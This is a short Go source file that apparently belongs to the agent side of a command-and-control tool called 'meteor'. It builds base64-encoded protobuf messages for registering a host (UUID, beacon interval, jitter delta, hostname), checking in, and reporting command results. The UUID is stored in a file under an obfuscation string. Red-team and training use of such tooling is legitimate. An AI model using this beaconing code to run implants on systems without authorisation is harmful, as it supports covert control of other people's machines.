package utils

import (
	"encoding/base64"
	"github.com/degenerat3/meteor/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	goUUID "github.com/google/uuid"
)

func genRegister(interval int, delta int, regFile string, obfText string) string {
	uuid := goUUID.New().String()
	storeUUID(regFile, uuid, obfText)
	hostname := getIP()
	pro := &mcs.MCS{
		Uuid:     uuid,
		Interval: int32(interval),
		Delta:    int32(delta),
		Hostname: hostname,
		Mode:     "register",
	}
	data, _ := proto.Marshal(pro)
	encoded := encodePayload(data)
	return encoded
}

// GenRegister is the exported version of the registration payload generator
func GenRegister(interval int, delta int, regFile string, obfText string) string {
	return genRegister(interval, delta, regFile, obfText)
}

func genCheckin(regFile string, obfText string) string {
	uuid := fetchUUID(regFile, obfText)
	pro := &mcs.MCS{
		Uuid: uuid,
		Mode: "checkin",
	}
	data, _ := proto.Marshal(pro)
	encoded := encodePayload(data)
	return encoded
}

// GenCheckin is the exported version of the checkIn payload generator
func GenCheckin(regFile string, obfText string) string {
	return genCheckin(regFile, obfText)
}

func genAddResult(uuid string, result string) string {
	pro := &mcs.MCS{
		Uuid:   uuid,
		Result: result,
		Mode:   "addResult",
	}
	data, _ := proto.Marshal(pro)
	encoded := encodePayload(data)
	return encoded
}

// GenAddResult is the exported version of the result add payload generator
func GenAddResult(uuid string, result string) string {
	return genAddResult(uuid, result)
}

func encodePayload(proto []byte) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(proto))
	encoded = encoded + "\n"
	return encoded
}

// EncodePayload is the exported version of the marshal'd protobuf to base64 encoder
func EncodePayload(proto []byte) string {
	return encodePayload(proto)
}
